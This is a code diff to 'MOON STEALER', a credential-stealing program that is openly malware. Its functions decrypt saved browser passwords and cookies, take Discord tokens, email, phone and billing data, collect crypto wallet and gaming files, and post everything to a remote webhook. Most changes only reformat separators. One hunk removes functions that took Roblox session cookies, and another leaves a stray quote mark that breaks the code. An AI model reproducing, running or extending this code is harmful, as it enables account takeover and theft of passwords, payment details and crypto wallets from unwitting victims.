@@ -144,7 +144,7 @@ def globalInfo():
     # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
     contry = ipdata["country_name"]
     contryCode = ipdata["country_code"].lower()
-    globalinfo = f":flag_{contryCode}:   -   `{username.upper()} ︰ {ip} [{contry}]`"
+    globalinfo = f":flag_{contryCode}:   -   `{username.upper()}   :   {ip} [{contry}]`"
     # print(globalinfo)
     return globalinfo
 
@@ -245,7 +245,7 @@ def GetUHQFriends(token):
                     OwnedBadges += badge["Emoji"]
                 flags = flags % badge["Value"]
         if OwnedBadges != "":
-            uhqlist += f"{OwnedBadges}︰{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
+            uhqlist += f"{OwnedBadges}  :  {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
     return uhqlist
 
 
@@ -424,36 +424,36 @@ def uploadToken(token, path):
                 "color": 12632256,
                 "fields": [
                     {
-                        "name": ":tickets: ︰ Token:",
+                        "name": ":tickets:   :   Token:",
                         "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})",
                     },
                     {
-                        "name": ":earth_asia:︰Email:",
+                        "name": ":earth_asia:  :  Email:",
                         "value": f"`{email}`",
                         "inline": True,
                     },
                     {
-                        "name": ":telephone_receiver:︰Phone:",
+                        "name": ":telephone_receiver:  :  Phone:",
                         "value": f"{phone}",
                         "inline": True,
                     },
                     {
-                        "name": ":globe_with_meridians:︰IP:",
+                        "name": ":globe_with_meridians:  :  IP:",
                         "value": f"`{getip()}`",
                         "inline": True,
                     },
                     {
-                        "name": ":beginner:︰Badges:",
+                        "name": ":beginner:  :  Badges:",
                         "value": f"{nitro}{badge}",
                         "inline": True,
                     },
                     {
-                        "name": ":credit_card:︰Billing:",
+                        "name": ":credit_card:  :  Billing:",
                         "value": f"{billing}",
                         "inline": True,
                     },
                     {
-                        "name": ":office:︰HQ Friends:",
+                        "name": ":office:  :  HQ Friends:",
                         "value": f"{friends}",
                         "inline": False,
                     },
@@ -494,16 +494,16 @@ def upload(name, link):
     }
 
     if name == "wpcook":
-        rb = "︰".join(da for da in cookiWords)
+        rb = "  :  ".join(da for da in cookiWords)
         if len(rb) > 1000:
             rrrrr = Reformat(str(cookiWords))
-            rb = "︰".join(da for da in rrrrr)
+            rb = "  :  ".join(da for da in rrrrr)
         data = {
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "MOON︰Cookies Stealer",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: ︰ **{CookiCount}** Cookies Found\n:link: ︰ [MOONCookies.txt]({link})",
+                    "title": "MOON  :  Cookies Stealer",
+                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie:   :   **{CookiCount}** Cookies Found\n:link:   :   [MOONCookies.txt]({link})",
                     "color": 12632256,
                     "footer": {
                         "text": "@MOON STEALER",
@@ -519,17 +519,17 @@ def upload(name, link):
         return
 
     if name == "wppassw":
-        ra = "︰".join(da for da in paswWords)
+        ra = "  :  ".join(da for da in paswWords)
         if len(ra) > 1000:
             rrr = Reformat(str(paswWords))
-            ra = "︰".join(da for da in rrr)
+            ra = "  :  ".join(da for da in rrr)
 
         data = {
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "MOON︰Password Stealer",
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 ︰ **{PasswCount}** Passwords Found\n:link: ︰ [MOONPassword.txt]({link})",
+                    "title": "MOON  :  Password Stealer",
+                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑   :   **{PasswCount}** Passwords Found\n:link:   :   [MOONPassword.txt]({link})",
                     "color": 12632256,
                     "footer": {
                         "text": "@MOON STEALER",
@@ -553,7 +553,7 @@ def upload(name, link):
                     "fields": [
                         {"name": "Interesting files found on user PC:", "value": link}
                     ],
-                    "author": {"name": "MOON︰File Stealer"},
+                    "author": {"name": "MOON  :  File Stealer"},
                     "footer": {
                         "text": "@MOON STEALER",
                         "icon_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
@@ -660,7 +660,7 @@ def getPassw(path, arg):
                     if not old in paswWords:
                         paswWords.append(old)
             Passw.append(
-                f"UR1: {row[0]}︰U53RN4M3: {row[1]}︰P455W0RD: {DecryptValue(row[2], master_key)}"
+                f"UR1: {row[0]}  :  U53RN4M3: {row[1]}  :  P455W0RD: {DecryptValue(row[2], master_key)}"
             )
             PasswCount += 1
     writeforfile(Passw, "passw")
@@ -712,7 +712,7 @@ def getCookie(path, arg):
                     if not old in cookiWords:
                         cookiWords.append(old)
             Cookies.append(
-                f"H057 K3Y: {row[0]}︰N4M3: {row[1]}︰V41U3: {DecryptValue(row[2], master_key)}"
+                f"H057 K3Y: {row[0]}  :  N4M3: {row[1]}  :  V41U3: {DecryptValue(row[2], master_key)}"
             )
             CookiCount += 1
     writeforfile(Cookies, "cook")
@@ -775,15 +775,15 @@ def GatherZips(paths1, paths2, paths3):
 
     wal, ga, ot = "", "", ""
     if not len(WalletsZip) == 0:
-        wal = ":coin: ︰ Wallets\n"
+        wal = ":coin:   :   Wallets\n"
         for i in WalletsZip:
             wal += f"└─ [{i[0]}]({i[1]})\n"
     if not len(WalletsZip) == 0:
-        ga = ":video_game: ︰ Gaming:\n"
+        ga = ":video_game:   :   Gaming:\n"
         for i in GamingZip:
             ga += f"└─ [{i[0]}]({i[1]})\n"
     if not len(OtherZip) == 0:
-        ot = ":tickets: ︰ Apps\n"
+        ot = ":tickets:   :   Apps\n"
         for i in OtherZip:
             ot += f"└─ [{i[0]}]({i[1]})\n"
     headers = {
@@ -1213,44 +1213,6 @@ if not DETECTED:
             filetext += "\n"
     upload("kiwi", filetext)
 
-
-def chrome_logger():
-    global cookie
-    try:
-        cookies = browser_cookie3.chrome(domain_name='roblox.com')
-        cookies = str(cookies)
-        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-
-    except:
-        pass
-
-def firefox_logger():
-    global cookie
-    try:
-        cookies = browser_cookie3.firefox(domain_name='roblox.com')
-        cookies = str(cookies)
-        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        
-    except:
-        pass
-
-def opera_logger():
-    global cookie
-    try:
-        cookies = browser_cookie3.firefox(domain_name='roblox.com')
-        cookies = str(cookies)
-        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        
-    except:
-        pass
-
-
-browsers = [chrome_logger, firefox_logger, opera_logger]
-
-for x in browsers:
-    threading.Thread(target=x,).start()
-
-
 ipify = "https://api.ipify.org/"
 response = requests.get(ipify)
 soup = BeautifulSoup(response.text, "html.parser")
@@ -1260,19 +1222,17 @@ os_version = platform.release()
 os_architecture = platform.machine()
 now = datetime.utcnow()
 hostname = socket.gethostbyaddr(ip_addr)[0]
-
-if 'cookie' not in locals():
-    cookie = "Not Found"
+"
 
 message = {
     "embeds": [
         {
-            "title": f"MOON︰Extras",
+            "title": f"MOON : Extras",
             "color": 12632256,
             "fields": [
                 {
                     "name": "-",
-                    "value": f"OS: **{os_name} {os_version} {os_architecture}**\nRoblox Cookie: `{cookie}`",
+                    "value": f"OS: **{os_name} {os_version} {os_architecture}**\n",
                 }
             ],
             "footer": {
